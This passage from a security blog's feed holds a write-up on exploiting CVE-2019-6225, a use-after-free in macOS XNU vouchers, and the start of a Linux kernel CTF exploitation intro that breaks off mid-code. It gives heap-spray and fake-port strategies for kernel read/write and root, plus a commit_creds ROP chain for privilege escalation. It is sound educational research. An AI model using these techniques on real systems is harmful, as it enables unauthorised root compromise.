&lt;li&gt;&lt;a href=&quot;#gogogo&quot;&gt;gogogo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Voucher, Port and Message: Exploit CVE-2019-6225 on macOS</title>
    <link href="https://kpwnz.github.io/2022/02/01/Voucher-Port-and-Message-Exploit-CVE-2019-6225-on-macOS/"/>
    <id>https://kpwnz.github.io/2022/02/01/Voucher-Port-and-Message-Exploit-CVE-2019-6225-on-macOS/</id>
    <published>2022-02-02T00:18:49.000Z</published>
    <updated>2022-04-04T09:51:18.357Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2019-6225</h1><h2 id="Vulnerability">Vulnerability</h2><p>The problem is in the MIG code.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">routine <span class="title">task_swap_mach_voucher</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">                task            : <span class="keyword">task_t</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">                new_voucher     : <span class="keyword">ipc_voucher_t</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">        inout   old_voucher     : <span class="keyword">ipc_voucher_t</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>this routine simply swaps two vouchers. Let’s take a look at the following codes.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mig_internal novalue _Xtask_swap_mach_voucher</span><br><span class="line">       (<span class="keyword">mach_msg_header_t</span> *InHeadP, <span class="keyword">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">kern_return_t</span> RetCode;</span><br><span class="line">   <span class="keyword">task_t</span> task;</span><br><span class="line">   <span class="keyword">ipc_voucher_t</span> new_voucher;</span><br><span class="line">   <span class="keyword">ipc_voucher_t</span> old_voucher;</span><br><span class="line">...</span><br><span class="line">   task = convert_port_to_task(In0P-&gt;Head.msgh_request_port);</span><br><span class="line"></span><br><span class="line">   new_voucher = convert_port_to_voucher(In0P-&gt;new_voucher.name);</span><br><span class="line"></span><br><span class="line">   old_voucher = convert_port_to_voucher(In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">   RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line"></span><br><span class="line">   ipc_voucher_release(new_voucher);</span><br><span class="line"></span><br><span class="line">   task_deallocate(task);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</span><br><span class="line">       MIG_RETURN_ERROR(OutP, RetCode);</span><br><span class="line">   &#125;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">if</span> (IP_VALID((<span class="keyword">ipc_port_t</span>)In0P-&gt;old_voucher.name))</span><br><span class="line">       ipc_port_release_send((<span class="keyword">ipc_port_t</span>)In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (IP_VALID((<span class="keyword">ipc_port_t</span>)In0P-&gt;new_voucher.name))</span><br><span class="line">       ipc_port_release_send((<span class="keyword">ipc_port_t</span>)In0P-&gt;new_voucher.name);</span><br><span class="line">...</span><br><span class="line">   OutP-&gt;old_voucher.name = (<span class="keyword">mach_port_t</span>)convert_voucher_to_port(old_voucher);</span><br><span class="line"></span><br><span class="line">   OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">   OutP-&gt;Head.msgh_size = (<span class="keyword">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</span><br><span class="line">   OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Well, everything seems correct here. Increase reference count and decrease it later.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new_voucher = convert_port_to_voucher(In0P-&gt;new_voucher.name);</span><br><span class="line"></span><br><span class="line">old_voucher = convert_port_to_voucher(In0P-&gt;old_voucher.name);</span><br><span class="line"></span><br><span class="line">RetCode = task_swap_mach_voucher(task, new_voucher, &amp;old_voucher);</span><br><span class="line"></span><br><span class="line">ipc_voucher_release(new_voucher);</span><br><span class="line"></span><br><span class="line">convert_voucher_to_port(old_voucher);</span><br></pre></td></tr></table></figure><p>But the implementation of <code>task_swap_mach_voucher</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">task_swap_mach_voucher</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">task_t</span>task,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">ipc_voucher_t</span>new_voucher,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">ipc_voucher_t</span>*in_out_old_voucher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (TASK_NULL == task)</span><br><span class="line"><span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">*in_out_old_voucher = new_voucher;</span><br><span class="line"><span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let <code>in_out_old_voucher</code> points to <code>new_voucher</code>.<br>Notice that <code>new_voucher</code> and <code>old_voucher</code> will point to the same voucher after the swapping routine, so <code>ipc_voucher_release()</code> and <code>convert_voucher_to_port()</code> actually decrease the reference count for a same voucher twice! Actually, there are two bugs in this routine. One can release the voucher and one can increase the reference count.</p><h2 id="Exploit">Exploit</h2><p>Obviously, the routine above caused a UaF but the problems is how to exploit it. Usually, we can convert a UaF into type confusion. But vouchers are allocated in a specific kernel zone, <code>ipc.voucher</code>, in XNU. If we want to achieve type confusion attack, we need to allocate the same memory space in another kernel zone.</p><h3 id="Cross-Zone-Attack">Cross Zone Attack</h3><p>Each XNU kernel zone has a free list and the memory allocator can retrieve free memory blocks from the free list. Once the elements in the free list run out, they need to allocate memory from the OS again. So if we can force the kernel to perform garbage collection and allocate tons of memory in other zones, we can make the <code>ipc_voucher_t</code> pointer points to a new kernel zone other than <code>ipc.voucher</code>.</p><h4 id="Heap-Spray">Heap Spray</h4><p>Depending on our exploitation strategy, we have two different ways to do the heap spraying.</p><h5 id="OOL-Ports">OOL Ports</h5><p>In XNU, we can send mach ports with out-of-line messages. Let’s take a look at the following codes.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ipc_kmsg_copyin_ool_ports_descriptor(</span><br><span class="line">        <span class="keyword">mach_msg_ool_ports_descriptor_t</span> *dsc,</span><br><span class="line">        <span class="keyword">mach_msg_descriptor_t</span> *user_dsc,</span><br><span class="line">        <span class="keyword">int</span> is_64bit,</span><br><span class="line">        <span class="keyword">vm_map_t</span> <span class="built_in">map</span>,</span><br><span class="line">        <span class="keyword">ipc_space_t</span> space,</span><br><span class="line">        <span class="keyword">ipc_object_t</span> dest,</span><br><span class="line">        <span class="keyword">ipc_kmsg_t</span> kmsg,</span><br><span class="line">        <span class="keyword">mach_msg_return_t</span> *mr) &#123;</span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    data = kalloc(ports_length);</span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So with specific ports count, we can kalloc in any <code>kalloc.x</code> zone we want. Here we show any example, we reallocate the <code>ith_voucher</code> field in <code>kalloc.1024</code> will <code>0xffffffffffffffff</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p (*(thread_t)0xffffff8029275840).ith_voucher</span><br><span class="line">(ipc_voucher_t) $316 = 0xffffff803527a320</span><br><span class="line">(lldb) whatis (*(thread_t)0xffffff8029275840).ith_voucher</span><br><span class="line">ADDRESS                          TYPE       OFFSET_IN_PG METADATA          </span><br><span class="line">0xffffff803527a320            Element           800/4096 0xffffff80234eed70</span><br><span class="line"></span><br><span class="line">Metadata Description:</span><br><span class="line">ZONE_METADATA      FREELIST             PG_CNT FREE_CNT ZONE               NAME                </span><br><span class="line">0xffffff80234eed70 0x0000000000000000        1        0 0xffffff801d890310 kalloc.1024</span><br><span class="line"></span><br><span class="line">Hexdump:</span><br><span class="line">ffffff803527a310  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">ffffff803527a320  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">ffffff803527a330  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">(lldb) </span><br></pre></td></tr></table></figure><h5 id="IOSurface">IOSurface</h5><p><code>IOSurfaceRootClient</code> exports <code>IOSurfaceRootUserClient::s_set_value(IOSurfaceRootUserClient*,void *,IOExternalMethodArguments *)</code> and use <code>OSUnserializeXML</code> to unserialize XML. If we pass a crafted binary data to <code>set_value</code>, we can alloc any data in any <code>kalloc.x</code> zone we want.  In this way, we can even construct a fake voucher instead of simple port pointer with OOL message.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *(ipc_voucher_t)0xffffff802d843af0</span><br><span class="line">(ipc_voucher) $9 = &#123;</span><br><span class="line">  iv_hash = 33</span><br><span class="line">  iv_sum = 4097</span><br><span class="line">  iv_refs = 1</span><br><span class="line">  iv_table_size = 8</span><br><span class="line">  iv_inline_table = ([0] = 4097, [1] = 0, [2] = 0, [3] = 0, [4] = 0, [5] = 0, [6] = 0, [7] = 0)</span><br><span class="line">  iv_table = 0xffffff802d843b00</span><br><span class="line">  iv_port = 0xffffff802d8485e0</span><br><span class="line">  iv_hash_link = &#123;</span><br><span class="line">    next = 0xffffff802dc65280</span><br><span class="line">    prev = 0xffffff802d8341e0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">(lldb) x/16xg 0xffffff802d843af0</span><br><span class="line">0xffffff802d843af0: 0x0000100100000021 0x0000000800000001   &lt;--- overwrite with our fake voucher</span><br><span class="line">0xffffff802d843b00: 0x0000000000001001 0x0000000000000000</span><br><span class="line">0xffffff802d843b10: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0xffffff802d843b20: 0xffffff802d843b00 0xffffff802d8485e0</span><br><span class="line">0xffffff802d843b30: 0xffffff802dc65280 0xffffff802d8341e0</span><br></pre></td></tr></table></figure><p>Also, we can even replace the <code>iv_port</code> field in <code>voucher</code>, so that we can completely control the <code>ipc_port</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x/32xg 0xffffff80170cf690</span><br><span class="line">0xffffff80170cf690: 0x4141414141414141 0x0000000000000011   &lt;--- sum, hash, reference</span><br><span class="line">0xffffff80170cf6a0: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0xffffff80170cf6b0: 0x0000000000000000 0x0000000000000000</span><br><span class="line">0xffffff80170cf6c0: 0x0000000000000000 0x0000000009556000   &lt;--- fake port</span><br><span class="line">0xffffff80170cf6d0: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="Exploit-Strategy">Exploit Strategy</h4><p>Based on two different cross zone attack method, we can have two different strategy.</p><ul><li>Spray pipe buffer</li><li>use <code>thread_set_mach_voucher</code> to save our uaf voucher pointer</li><li>release the uaf voucher</li><li>reallocate the uaf voucher with OOL ports pointer, let <code>iv_ref</code> field overlaps with the pointer</li><li>use CVE-2019-6225 again to tweak <code>iv_ref</code>, move the pointer to the pipe buffer control by us.</li><li>construct the fake port in pipe buffer</li><li>receive the OOL ports again in userland</li><li>construct tfp0, profit!</li></ul><p>But it’s a little bit difficult to get a valid <code>iv_ref</code> value since we need to make sure the higher 31 to 27 bits are 0.</p><p>So we can consider the following steps</p><ul><li>use <code>thread_set_mach_voucher</code> to save our uaf voucher pointer</li><li>release the uaf voucher</li><li>replace the uaf voucher with fake voucher, and let <code>iv_port</code> points to the fake <code>ipc_port</code> in userland</li><li>use <code>thread_get_mach_voucher</code> to get the fake port</li><li>use <code>pid_for_task</code> to read kernel</li><li>build tfp0, profit!</li></ul><h2 id="Get-root-privilege">Get root privilege</h2><h3 id="KASLR">KASLR</h3><p>With <code>clock_sleep_trap</code> we can brute force kernel slide.</p><h3 id="Kernel-Read-and-Write">Kernel Read and Write</h3><p>We can still use <code>pid_for_task</code> to read any kernel memory once we construct our fake task. Since iOS 11, Apple added a new mitigation that only kernel can resolve kernel task port. But if we want to achieve arbitrary kernel rw, we only need the vm map of kernel task. So we can copy the <code>vm_map_t</code> pointer from kernel task to our fake task then we can get arbitrary kernel and then can get root privilege by overwriting cred. Check <a href="https://github.com/KpwnZ/g3tr00t">https://github.com/KpwnZ/g3tr00t</a> for the exploitation detail.</p><h2 id="References">References</h2><p><a href="https://googleprojectzero.blogspot.com/2019/01/voucherswap-exploiting-mig-reference.html">https://googleprojectzero.blogspot.com/2019/01/voucherswap-exploiting-mig-reference.html</a></p><p><a href="https://blog.siguza.net/v0rtex/">https://blog.siguza.net/v0rtex/</a></p><p><a href="https://github.com/PsychoTea/machswap2">https://github.com/PsychoTea/machswap2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CVE-2019-6225&lt;/h1&gt;
&lt;h2 id=&quot;Vulnerability&quot;&gt;Vulnerability&lt;/h2&gt;
&lt;p&gt;The problem is in the MIG code.&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="iOS" scheme="https://kpwnz.github.io/tags/iOS/"/>
    
    <category term="XNU" scheme="https://kpwnz.github.io/tags/XNU/"/>
    
    <category term="macOS" scheme="https://kpwnz.github.io/tags/macOS/"/>
    
    <category term="exploit" scheme="https://kpwnz.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>An Intro to Linux Kernel Pwn in CTF</title>
    <link href="https://kpwnz.github.io/2021/11/25/Linux-kernel-pwn-in-CTF/"/>
    <id>https://kpwnz.github.io/2021/11/25/Linux-kernel-pwn-in-CTF/</id>
    <published>2021-11-25T19:28:06.000Z</published>
    <updated>2021-12-01T16:27:04.771Z</updated>
    
    <content type="html"><![CDATA[<h1>An Intro to Linux Kernel Pwn in CTF</h1><h2 id="Intro">Intro</h2><p>In this post we will have a brief view about Linux kernel pwn, what we need to do and how it works.</p><p>Actually Linux kernel pwn is similar to userland pwn, except that our target is the kernel(or kernel module). In most of the cases, the vulnerability is in custom Linux Kernel Module, LKM, which provides service to user as a part of kernel in ring0. Usually, the emulator for the task in Linux kernel pwn in CTF is <code>qemu</code>. And the challenge will often be deployed with the following files:</p><ul><li>vmlinux, the Linux kernel. Sometimes it will be packed into <code>bzImage</code> from which you can extract the kernel. The kernel is an ELF file and you can run ROPGadget or ropper against it like common userland pwn.</li><li>Linux root file system. The compression schemes are usually <code>cpio</code> and <code>gzip</code></li><li>A script to launch the emulator with specific configuration</li></ul><p>Let’s go further now, some basic knowledge of operating system is required here.</p><h2 id="Our-goal">Our goal</h2><p>Our main goal in Linux kernel pwn is getting root privilege since the “flag” can only be accessed with root in most cases, which means privilege escalation.</p><!-- ## ProtectionMany protections in kernel are similar to those in uesrland such as canary, ASLR and NX. Besides, there are many mitigations for kernel.### KPTIKernel page table isolation. As the name suggests, it will isolates the kernel page table with user space page table. ### SMEPSupervisor mode execution protection. SMEP marks all pages in userland as NX when switching to kernel mode. So the attacker may be able to set up shell code in userland and jump to it in kernel mode.### SMAP --><h2 id="Privilege-escalation">Privilege escalation</h2><p>First let’s take a look at the structure of process in Linux kernel.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For reasons of header soup (see current_thread_info()), this</span></span><br><span class="line"><span class="comment"> * must be the first element of task_struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span><span class="title">thread_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>__state;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PREEMPT_RT</span></span><br><span class="line"><span class="comment">/* saved state for &quot;spinlock sleepers&quot; */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>saved_state;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...........</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ............</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>and <code>struct cred</code> contains the <code>gid</code> and <code>uid</code> of the process. It’s obviously that if we can control the subjective <code>cred</code> of a specific process then we can achieve privilege escaltion.</p><p>Luckily, we do have serveral ways to change our credential:</p><ul><li>Overwrite the <code>cred</code> in the link list of process with arbitary kernel rw.</li><li>Find the code path in kernel that can set the credential of process and perform a kernel ROP.</li></ul><p>Also, we can control another process with root privilege and gain arbitary code exec in that process. But we will take a closer look at the last one first since it’s almost the same as ROP in userland.</p><h2 id="Kernel-ROP">Kernel ROP</h2><p>We need to find a method to assign new cred to our process. Searching through the source code, we find that</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * commit_creds - Install new credentials upon the current task</span></span><br><span class="line"><span class="comment"> * @new: The credentials to be assigned</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Install a new set of credentials to the current task, using RCU to replace</span></span><br><span class="line"><span class="comment"> * the old set.  Both the objective and the subjective credentials pointers are</span></span><br><span class="line"><span class="comment"> * updated.  This function may not be called if the subjective credentials are</span></span><br><span class="line"><span class="comment"> * in an overridden state.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function eats the caller&#x27;s reference to the new credentials.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Always returns 0 thus allowing this function to be tail-called at the end</span></span><br><span class="line"><span class="comment"> * of, say, sys_setgid().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p>Exactly what we need! So if we can find a <code>cred</code> for a process with root privilege then we can use the function above to assign this <code>cred</code> to our process(current process). Luckily, we have</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_kernel_cred - Prepare a set of credentials for a kernel service</span></span><br><span class="line"><span class="comment"> * @daemon: A userspace daemon to be used as a reference</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a set of credentials for a kernel service.  This can then be used to</span></span><br><span class="line"><span class="comment"> * override a task&#x27;s own credentials so that work can be done on behalf of that</span></span><br><span class="line"><span class="comment"> * task that requires a different subjective context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @daemon is used to provide a base for the security record, but can be NULL.</span></span><br><span class="line"><span class="comment"> * If @daemon is supplied, then the security data will be derived from that;</span></span><br><span class="line"><span class="comment"> * otherwise they&#x27;ll be set to 0 and no groups, full capabilities and no keys.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller may change these controls afterwards if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the new credentials or NULL if out of memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">validate_creds(old);</span><br><span class="line">    <span class="comment">// ............</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When <code>daemon</code> is null, <code>old</code> will be set to <code>init_cred</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">.usage= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">.subscribers= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">.magic= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.uid= GLOBAL_ROOT_UID,</span><br><span class="line">.gid= GLOBAL_ROOT_GID,</span><br><span class="line">.suid= GLOBAL_ROOT_UID,</span><br><span class="line">.sgid= GLOBAL_ROOT_GID,</span><br><span class="line">.euid= GLOBAL_ROOT_UID,</span><br><span class="line">.egid= GLOBAL_ROOT_GID,</span><br><span class="line">.fsuid= GLOBAL_ROOT_UID,</span><br><span class="line">.fsgid= GLOBAL_ROOT_GID,</span><br><span class="line">.securebits= SECUREBITS_DEFAULT,</span><br><span class="line">.cap_inheritable= CAP_EMPTY_SET,</span><br><span class="line">.cap_permitted= CAP_FULL_SET,</span><br><span class="line">.cap_effective= CAP_FULL_SET,</span><br><span class="line">.cap_bset= CAP_FULL_SET,</span><br><span class="line">.user= INIT_USER,</span><br><span class="line">.user_ns= &amp;init_user_ns,</span><br><span class="line">.group_info= &amp;init_groups,</span><br><span class="line">.ucounts= &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Which has all we need! So our ROP chain should be</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(null));</span><br></pre></td></tr></table></figure><p>after which we can achieve privilege escalation.</p><h2 id="Back-to-userland">Back to userland</h2><p>After we getting root privilege, we are still in kernel mode. Our main goal is spawning a root shell in userland, so we need to return to user mode with the following steps.</p><ul><li><code>swapgs</code></li><li><code>iretq</code></li></ul><p>Take a look at the implementation of Linux</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 